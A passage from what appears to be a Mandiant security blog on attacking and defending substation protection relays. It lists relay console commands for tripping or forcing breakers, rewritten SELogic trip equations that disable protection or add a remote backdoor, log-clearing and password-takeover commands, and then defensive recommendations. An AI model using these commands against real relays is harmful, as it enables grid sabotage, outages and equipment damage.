physically compromised.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Command Interfaces and Targets</span></h3>\n<p><span style=\"vertical-align: baseline;\">With access established whether through credential abuse, exposed network services, or direct hardware bypass the attacker is now in a position to issue live commands to the relay. At this stage, the focus shifts from reconnaissance to manipulation, leveraging built-in interfaces to override protection logic and directly influence power system behavior.</span></p>\n<p><span style=\"vertical-align: baseline;\">Here's how these attacks unfold in a real-world scenario:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Manual Breaker Operation: An attacker can directly issue control commands to the relay to simulate faults or disrupt operations.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p>Example commands include:</p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">==&gt;PUL OUT101 5</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">; Pulse output for 5 seconds to trip breaker</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">=&gt;CLO</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">; Force close breaker</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">=&gt;OPE</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">; Force open breaker</span></p>\n</li>\n</ul>\n</li>\n<li style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">These commands bypass traditional protection logic, allowing relays to open or close breakers on demand. This can isolate critical feeders, create artificial faults, or induce overload conditions—all without triggering standard fault detection sequences.</span></li>\n</ul>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Programmable Trip Logic Manipulation</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p>Modern protection relays such as those from SEL (SELogic), GE (FlexLogic), ABB (CAP tools), and Siemens (CFC), support customizable trip logic through embedded control languages. These programmable logic engines enable utilities to tailor protection schemes to site-specific requirements. However, this powerful feature also introduces a critical attack surface. If an adversary gains privileged access, they can manipulate core logic equations to suppress legitimate trips, trigger false operations, or embed stealthy backdoors that evade normal protection behavior.<br /><br />One of the most critical targets in this logic chain is the Trip Request (TR) output, the internal control signal that determines whether the relay sends a trip command to the circuit breaker.<br /><br />This equation specifies the fault conditions under which the relay should initiate a trip. Each element represents a protection function or status input, such as zone distance, overcurrent detection, or breaker position and collectively they form the basis of coordinated relay response.<br /><br />In the relay operation chain, the TR equation is at the core of the protection logic.</p>\n</li>\n</ul>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"TR Logic Evaluation within the Protection Relay Operation Chain\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/unbiased-tr-logic-figure3.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 3: TR Logic Evaluation within the Protection Relay Operation Chain</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p style=\"padding-left: 40px;\"><span style=\"vertical-align: baseline;\">In SEL devices, for example, this TR logic is typically defined using a SELogic control equation. A representative version might look like this:</span></p>\n<p style=\"padding-left: 40px;\"><span style=\"font-style: italic; vertical-align: baseline;\">TR = M1P + Z1G + M2PT + Z2GT + 51GT + 51QT + 50P1 * SH0</span></p>\n<p style=\"padding-left: 40px;\"><span style=\"vertical-align: baseline;\">Table 1 includes an explanation of each element.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1px\" cellpadding=\"16px\" style=\"border-collapse: collapse; margin-left: auto; margin-right: auto;\"><colgroup><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Element</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Description</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">M1P</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Zone 1 Phase distance element, it trips on phase faults within Zone 1.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Z1G</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Zone 1 Ground distance element, trips on ground faults within Zone 1</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">M2PT</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Phase distance element from Channel M2, Phase Trip (could be Zone 2)</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Z2GT</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Zone 2 Ground distance Trip element, for ground faults in Zone 2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">51GT</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Time-overcurrent element for ground faults (ANSI 51G)</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">51QT</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Time-overcurrent element for negative-sequence current (unbalanced faults)</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">50P1</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Instantaneous phase overcurrent element (ANSI 50P) for Zone 1</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">SH0</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Breaker status input, logic 1 when breaker is closed</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Table 1: Elements of TR</span></p>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p style=\"padding-left: 40px;\"><span style=\"vertical-align: baseline;\">In the control equation, the + operator means logical OR, and * means logical AND. Therefore, the logic asserts TR if:</span></p>\n<ul>\n<li>\n<ul>\n<li>\n<ul>\n<li>\n<ul>\n<li>\n<ul>\n<li><span style=\"vertical-align: baseline;\">Any of the listed fault elements (distance, overcurrent) are active, or</span></li>\n<li><span style=\"vertical-align: baseline;\">An instantaneous overcurrent occurs while the breaker is closed.</span></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p style=\"padding-left: 40px;\"><span style=\"vertical-align: baseline;\">In effect, the breaker is tripped:</span></p>\n<ul>\n<li>\n<ul>\n<li>\n<ul>\n<li>\n<ul>\n<li>\n<ul>\n<li><span style=\"vertical-align: baseline;\">If a phase or ground fault is detected in Zone 1 or Zone 2</span></li>\n<li><span style=\"vertical-align: baseline;\">If a time-overcurrent condition develops</span></li>\n<li><span style=\"vertical-align: baseline;\">Or if there's an instantaneous spike while the breaker is in service</span></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">How Attackers Can Abuse the TR Logic</span></h3>\n<p><span style=\"vertical-align: baseline;\">With editing access, attackers can rewrite this logic to suppress protection, force false trips, or inject stealthy backdoors.</span></p>\n<p><span style=\"vertical-align: baseline;\">Table 2 shows common logic manipulation variants.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1px\" cellpadding=\"16px\" style=\"border-collapse: collapse; margin-left: auto; margin-right: auto;\"><colgroup><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Attack Type</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Modified Logic</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Effect</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Disable All Trips</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TR = 0</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Relay never trips, even during major faults. Allows sustained short circuits, potentially leading to fires or equipment failure.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Force Constant Tripping</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TR = 1, TRQUAL = 0</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Relay constantly asserts trip, disrupting power regardless of fault status.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Impossible Condition</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TR = 50P1 * !SH0</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Breaker only trips when already open, a condition that never occurs.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Remove Ground Fault Detection</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TR = M1P + M2PT + 50P1 * SH0</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Relay ignores ground faults entirely, a dangerous and hard-to-detect attack.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Hidden Logic Backdoor</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TR = original + RB15</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Attacker can trigger trip remotely via RB15 (a Remote Bit), even without a real fault.</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Table 2: TR logic bombs</span></p>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Disable Trip Unlatching (ULTR)</span></h4>\n<ul>\n<li><span style=\"vertical-align: baseline;\">ULTR = 0</span></li>\n<li><span style=\"vertical-align: baseline;\">Impact: Prevents the relay from resetting after a trip. The breaker stays open until manually reset, which delays recovery and increases outage durations.</span></li>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">Reclose Logic Abuse</span></h4>\n<ul>\n<li><span style=\"vertical-align: baseline;\">79RI = 1 </span><span style=\"vertical-align: baseline;\">; Reclose immediately</span></li>\n<li><span style=\"vertical-align: baseline;\">79STL = 0        </span><span style=\"vertical-align: baseline;\">; Skip supervision logic</span></li>\n<li><span style=\"vertical-align: baseline;\">Impact: Forces breaker to reclose repeatedly, even into sustained faults. Can damage transformer windings, burn breaker contacts, or create oscillatory failures.</span></li>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">LED Spoofing</span></h4>\n<ul>\n<li><span style=\"vertical-align: baseline;\">LED12 = !TRIP</span></li>\n<li><span style=\"vertical-align: baseline;\">Impact: Relay front panel shows a \"healthy\" status even while tripped. Misleads field technicians during visual inspections.</span></li>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">Event Report Tampering</span></h4>\n<ul>\n<li><span style=\"vertical-align: baseline;\">=&gt;EVE</span><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">            </span></span><span style=\"vertical-align: baseline;\">; View latest event</span></li>\n<li><span style=\"vertical-align: baseline;\">=&gt;TRI</span><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">             </span></span><span style=\"vertical-align: baseline;\">; Manually trigger report</span></li>\n<li><span style=\"vertical-align: baseline;\">=&gt;SER C</span><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">        </span></span><span style=\"vertical-align: baseline;\">; Clear Sequential Event Recorder</span></li>\n<li><span style=\"vertical-align: baseline;\">Impact: Covers attacker footprints by erasing evidence. Removes Sequential Event Recorder (SER) logs and trip history. Obstructs post-event forensics.</span></li>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">Change Distance Protection Settings</span></h4>\n<ul>\n<li><span style=\"vertical-align: baseline;\">In the relay protection sequence, distance protection operates earlier in the decision chain, evaluating fault conditions based on impedance before the trip logic is executed to issue breaker commands.</span></li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Distance protection settings in a Relay Operation Chain\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/distance-protection-figure4.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 4: Distance protection settings in a Relay Operation Chain</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><ul>\n<li><span style=\"vertical-align: baseline;\">Impact: Distance protection relies on accurately configured impedance reach (Z1MAG) and impedance angle (Z1ANG) to detect faults within a predefined section of a transmission line (typically 80–100% of line length for Zone 1). Manipulating these values can have the following consequences:</span>\n<ul>\n<li>Under-Reaching: Reducing Z1MAG to 0.3 causes the relay to detect faults only within 30% of the line length, making it blind to faults in the remaining 70% of the protected zone. This can result in missed trips, delayed fault clearance, and cascading failures if the backup protection does not act in time.</li>\n<li>Impedance Angle Misalignment: Changing Z1ANG affects the directional sensitivity and fault classification. If the angle deviates from system characteristics, the relay may misclassify faults or fail to identify high-resistance faults, particularly on complex line configurations like underground cables or series-compensated lines.</li>\n<li>False Trips: In certain conditions, especially with heavy load or load encroachment, a misconfigured distance zone may interpret normal load flow as a fault, resulting in nuisance tripping and unnecessary outages.</li>\n<li>Compromised Selectivity &amp; Coordination: The distance element's coordination with other relays (e.g., Zone 2 or remote end Zone 1) becomes unreliable, leading to overlapping zones or gaps in coverage, defeating the core principle of selective protection.</li>\n</ul>\n</li>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">Restore Factory Defaults</span></h4>\n<ul>\n<li><span style=\"vertical-align: baseline;\">=&gt;&gt;R_S</span></li>\n<li><span style=\"vertical-align: baseline;\">Impact: Wipes all hardened settings, password protections, and customized logic. Resets the relay to an insecure factory state.</span></li>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">Password Modification for Persistence</span></h4>\n<ul>\n<li><span style=\"vertical-align: baseline;\">=&gt;&gt;PAS 1 &lt;newpass&gt;</span></li>\n<li><span style=\"vertical-align: baseline;\">Impact: Locks out legitimate users. Maintains long-term attacker access. Prevents operators from reversing changes quickly during incident response.</span></li>\n</ul></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">What Most Environments Still Get Wrong</span></h2>\n<p><span style=\"vertical-align: baseline;\">Despite increasing awareness, training, and incident response playbooks, many substations and critical infrastructure sites continue to exhibit foundational security weaknesses. These are not simply oversights—they're systemic, shaped by the realities of substation lifecycle management, legacy system inertia, and the operational constraints of critical grid infrastructure.</span></p>\n<p><span style=\"vertical-align: baseline;\">Modernizing substation cybersecurity is not as simple as issuing new policies or buying next-generation tools. Substations typically undergo major upgrades on decade-long cycles, often limited to component replacement rather than full network redesigns. Integrating modern security features like encrypted protocols, central access control, or firmware validation frequently requires adding computers, increasing bandwidth, and introducing centralized key management systems. These changes are non-trivial in bandwidth-constrained environments built for deterministic, low-latency communication—not IT-grade flexibility.</span></p>\n<p><span style=\"vertical-align: baseline;\">Further complicating matters, vendor product cycles move faster than infrastructure refresh cycles. It's not uncommon for new protection relays or firmware platforms to be deprecated or reworked before they're fully deployed across even one utility's fleet, let alone hundreds of substations.</span></p>\n<p><span style=\"vertical-align: baseline;\">The result? A patchwork of legacy protocols, brittle configurations, and incomplete upgrades that adversaries continue to exploit. In the following section, we examine some of the most critical and persistent gaps, why they still exist, and what can realistically be done to address them.</span></p>\n<p><span style=\"vertical-align: baseline;\">This section highlights the most common and dangerous security gaps observed in real-world environments.</span></p>\n<ol>\n<li><span style=\"vertical-align: baseline;\">Legacy Protocols Left Enabled</span>\n<ul>\n<li>Relays often come with older communication protocols such as:\n<ul>\n<li>Telnet (unencrypted remote access)</li>\n<li>FTP (insecure file transfer)</li>\n<li>Modbus RTU/TCP (lacks authentication or encryption)</li>\n</ul>\n</li>\n<li>These are frequently left enabled by default, exposing relays to:\n<ul>\n<li>Credential sniffing</li>\n<li>Packet manipulation</li>\n<li>Unauthorized control commands</li>\n</ul>\n</li>\n<li>Recommendation: Where possible, disable legacy services and transition to secure alternatives (e.g., SSH, SFTP, or IEC 62351 for secured GOOSE/MMS). If older services must be retained, tightly restrict access via VLANs, firewalls, and role-based control.</li>\n</ul>\n</li>\n<li>IT/OT Network Convergence Without Isolation\n<ul>\n<li>Modern substations may share network infrastructure with enterprise IT environments:\n<ul>\n<li>VPN access to Substation networks</li>\n<li>Shared switches or VLANs between SCADA systems and relay networks</li>\n<li>Lack of firewalls or access control lists (ACLs)</li>\n</ul>\n</li>\n<li>This exposes protection relays to malware propagation, ransomware, or lateral movement from compromised IT assets.</li>\n<li>Recommendation: Establish strict network segmentation using firewalls, ACLs, and dedicated protection zones. All remote access should be routed through Privileged Access Management (PAM) platforms with MFA, session recording, and Just-In-Time access control.</li>\n</ul>\n</li>\n<li>Default or Weak Relay Passwords\n<ul>\n<li>In red team and audit exercises, default credentials are still found in the field sometimes printed on the relay chassis itself.\n<ul>\n<li>Factory-level passwords like LEVEL2, ADMIN, or OPERATOR remain unchanged.</li>\n<li>Passwords physically labeled on devices</li>\n<li>Password sharing among field teams compromises accountability.</li>\n</ul>\n</li>\n<li>These practices persist due to operational convenience, lack of centralized credential management, and difficulty updating devices in the field.</li>\n<li>Recommendation: Mandate site-specific, role-based credentials with regular rotation and enforced via centralized relay management tools. Ensure audit logging of all access attempts and password changes.</li>\n</ul>\n</li>\n<li>Built-in Security Features Left Unused\n<ul>\n<li>OEM vendors already provide a suite of built-in security features, yet these are rarely configured in production environments. Security features such as role-based access control (RBAC), secure protocol enforcement (e.g., HTTPS, SSH), user-level audit trails, password retry lockouts, and alert triggers (e.g., BADPASS or SETCHG bits) are typically disabled or ignored during commissioning. In many cases, these features are not even evaluated due to time constraints, lack of policy enforcement, or insufficient familiarity among field engineers.<br /><br />These oversight patterns are particularly common in environments that inherit legacy commissioning templates, where security features are left in their default or least-restrictive state for the sake of expediency or compatibility.</li>\n<li>Recommendation: Security configurations must be explicitly reviewed during commissioning and validated periodically. At a minimum:\n<ul>\n<li>Enable RBAC and enforce user-level permission tiers.</li>\n<li>Configure BADPASS, ALARM, SETCHG, and similar relay logic bits to generate real-time telemetry.</li>\n<li>Use secure protocols (HTTPS, SSH, IEC 62351) where supported.</li>\n<li>Integrate security bit changes and access logs into central SIEM or NMS platforms for correlation and alerting.</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>Engineering Laptops with Stale Firmware Tools\n<ul>\n<li>OEM vendors also release firmware updates to fix any known security vulnerabilities and bugs. However:\n<ul>\n<li>Engineering laptops often use outdated configuration software</li>\n<li>Old firmware loaders may upload legacy or vulnerable versions</li>\n<li>Security patches are missed entirely</li>\n</ul>\n</li>\n<li>Recommendation: Maintain hardened engineering baselines with validated firmware signing, trusted toolchains, and controlled USB/media usage. Track firmware versions across the fleet for vulnerability exposure.</li>\n</ul>\n</li>\n<li>No Alerting on Configuration or Logic Changes\n<ul>\n<li>Protection relays support advanced logic and automation features like SELogic and FlexLogic but in many environments, no alerting is configured for changes. This makes it easy for attackers (or even insider threats) to silently:\n<ul>\n<li>Modify protection logic</li>\n<li>Switch setting groups</li>\n<li>Suppress alarms or trips</li>\n</ul>\n</li>\n<li>Recommendation: Enable relay-side event-based alerting for changes to settings, logic, or outputs. Forward logs to a central SIEM or security operations platform capable of detecting unauthorized logic uploads or suspicious relay behavior.</li>\n</ul>\n</li>\n<li>Relays Not Included in Security Audits or Patch Cycles\n<ul>\n<li>Relays are often excluded from regular security practices:\n<ul>\n<li>Not scanned for vulnerabilities</li>\n<li>Not included in patch management systems</li>\n<li>No configuration integrity monitoring or version tracking</li>\n</ul>\n</li>\n<li>This blind spot leaves highly critical assets unmanaged, and potentially exploitable.</li>\n<li>Recommendation: Bring protection relays into the fold of cybersecurity governance, with scheduled audits, patch planning, and configuration monitoring. Use tools that can validate settings integrity and detect tampering, whether via vendor platforms or third-party relay management suites.</li>\n</ul>\n</li>\n<li>Physical Tamper Detection Features Not Monitored\n<ul>\n<li>Many modern protection relays include hardware-based tamper detection features designed to alert operators when the device enclosure is opened or physically manipulated. These may include:\n<ul>\n<li>Chassis tamper switches that trigger digital inputs or internal flags when the case is opened.</li>\n<li>Access jumper position monitoring, which can be read via relay logic or status bits.</li>\n<li>Power cycle detection, especially relevant when jumpers are toggled (e.g., SEL relays require a power reset to apply jumper changes).</li>\n<li>Relay watchdog or system fault flags, indicating unexpected reboots or logic resets post-manipulation.</li>\n</ul>\n</li>\n<li>Despite being available, these physical integrity indicators are rarely wired into the SCADA system or included in alarm logic. As a result, an attacker could open a relay, trigger the access jumper, or insert a rogue SD card—and leave no real-time trace unless other controls are in place.</li>\n<li>Recommendation: Utilities should enable and monitor all available hardware tamper indicators:\n<ul>\n<li>Wire tamper switches or digital input changes into RTUs or SCADA for immediate alerts.</li>\n<li>Monitor ALARM, TAMPER, SETCHG, or similar logic bits in relays that support them (e.g., SEL WORD bits).</li>\n<li>Configure alert logic to correlate with badge access logs or keycard systems—raising a flag if physical access occurs outside scheduled maintenance windows.</li>\n<li>Include physical tamper status as a part of substation security monitoring dashboards or intrusion detection platforms.</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<h2><span style=\"vertical-align: baseline;\">From Oversights to Action — A New Baseline for Relay Security</span></h2>\n<p><span style=\"vertical-align: baseline;\">The previously outlined vulnerabilities aren't limited to isolated cases, they reflect systemic patterns across substations, utilities, and industrial sites worldwide. As the attack surface expands with increased connectivity, and as adversaries become more sophisticated in targeting protection logic, these security oversights can no longer be overlooked.</span></p>\n<p><span style=\"vertical-align: baseline;\">But securing protection relays doesn't require reinventing the wheel. It begins with the consistent application of fundamental security practices, drawn from real-world incidents, red-team assessments, and decades of power system engineering wisdom.</span></p>\n<p><span style=\"vertical-align: baseline;\">While these practices can be retrofitted into existing environments, it's critical to emphasize that security is most effective when it's built in by design, not bolted on later. Retrofitting controls in fragile operational environments often introduces more complexity, risk, and room for error. For long-term resilience, security considerations must be embedded into system architecture from the initial design and commissioning stages.</span></p>\n<p><span style=\"vertical-align: baseline;\">To help asset owners, engineers, and cybersecurity teams establish a defensible and vendor-agnostic baseline, Mandiant has compiled the \"Top 10 Security Practices for Substation Relays,\" a focused and actionable framework applicable across protocols, vendors, and architectures.</span></p>\n<p><span style=\"vertical-align: baseline;\">In developing this list, Mandiant has drawn inspiration from the broader ICS security community—particularly initiatives like the \"<a href=\"https://plc-security.com/index.html\" rel=\"noopener\" target=\"_blank\">Top 20 Secure PLC Coding Practices</a>\" developed by experts in the field of industrial automation and safety instrumentation. While protection relays are not the same as PLCs, they share many characteristics: firmware-driven logic, critical process influence, and limited error tolerance.</span></p>\n<p><span style=\"vertical-align: baseline;\">The 